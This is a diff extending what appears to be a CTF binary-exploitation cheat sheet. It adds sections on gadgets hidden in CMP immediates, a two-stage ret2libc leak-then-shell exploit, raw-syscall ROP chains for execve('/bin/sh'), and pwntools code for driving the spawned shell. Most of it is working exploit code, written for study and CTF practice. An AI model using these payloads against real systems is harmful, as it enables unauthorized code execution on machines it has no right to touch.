@@ -197,6 +197,28 @@ ROPgadget --binary binary | grep "pop rdi"
 objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
 ```
 
+### Hidden Gadgets in CMP Immediates
+
+CMP instructions with large immediates encode useful byte sequences. pwntools `ROP()` finds these automatically:
+
+```asm
+# Example: cmpl $0xc35e415f, -0x4(%rbp)
+# Bytes: 81 7d fc 5f 41 5e c3
+#                  ^^ ^^ ^^ ^^
+# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
+# At +4: 41 5e c3    = pop r14; ret
+# At +5: 5e c3       = pop rsi; ret
+```
+
+**When to look:** Small binaries with few functions often lack standard gadgets. Check `cmp`, `mov`, and `test` instructions with large immediates — their operand bytes may decode as useful gadgets.
+
+```python
+rop = ROP(elf)
+# pwntools finds these automatically
+for addr, gadget in rop.gadgets.items():
+    print(hex(addr), gadget)
+```
+
 ## Struct Pointer Overwrite (Heap Menu Challenges)
 
 **Pattern:** Menu-based programs with create/modify/delete/view operations on structs containing both data buffers and pointers. The modify/edit function reads more bytes than the data buffer, overflowing into adjacent pointer fields.
@@ -262,6 +284,91 @@ payload = flat(
     elf.plt['puts'],
     elf.symbols['main']
 )
+```
+
+### Two-Stage ret2libc (Leak + Shell)
+
+When exploiting in two stages, choose the return target for stage 2 carefully:
+
+```python
+# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
+payload1 = b'A' * offset
+payload1 += p64(pop_rdi)
+payload1 += p64(elf.got['puts'])
+payload1 += p64(elf.plt['puts'])
+payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main
+
+# IMPORTANT: Return target after leak
+# - Returning to main may crash if check_status/setup corrupts stack
+# - Returning to vuln directly may have stack issues
+# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
+#   This sets up a clean stack frame via the CALL instruction
+```
+
+**Leak parsing with no-newline printf:**
+```python
+# If printf("Laundry complete") has no trailing newline,
+# puts() leak appears right after it on the same line:
+# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
+p.recvuntil(b'Laundry complete')
+leaked = p.recvline().strip()
+libc_addr = u64(leaked.ljust(8, b'\x00'))
+```
+
+### Raw Syscall ROP (When system() Fails)
+
+If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:
+
+```python
+# Find gadgets in libc
+libc_rop = ROP(libc)
+pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
+pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
+pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
+syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]
+
+# execve("/bin/sh", NULL, NULL) = syscall 59
+payload = b'A' * offset
+payload += p64(libc_base + pop_rax)
+payload += p64(59)
+payload += p64(libc_base + pop_rdi)
+payload += p64(libc_base + next(libc.search(b'/bin/sh')))
+payload += p64(libc_base + pop_rsi)
+payload += p64(0)
+payload += p64(libc_base + pop_rdx_rbx)
+payload += p64(0)
+payload += p64(0)  # rbx junk
+payload += p64(libc_base + syscall_ret)
+```
+
+**When to use raw syscall vs libc functions:**
+- `system()` through libc: simplest, but may crash due to stack alignment or CET
+- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
+- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
+- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead
+
+### Shell Interaction After execve
+
+After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.
+
+```python
+p.send(payload)  # Trigger execve
+
+# Wait for shell to initialize before sending commands
+import time
+time.sleep(1)
+p.sendline(b'id')
+time.sleep(0.5)
+result = p.recv(timeout=3)
+
+# For flag retrieval:
+p.sendline(b'cat /flag* flag* 2>/dev/null')
+time.sleep(0.5)
+flag = p.recv(timeout=3)
+
+# DON'T pipe commands via stdin when using pwntools - they get consumed
+# by earlier read() calls. Use explicit sendline() after delays instead.
 ```
 
 ## Pwntools Template
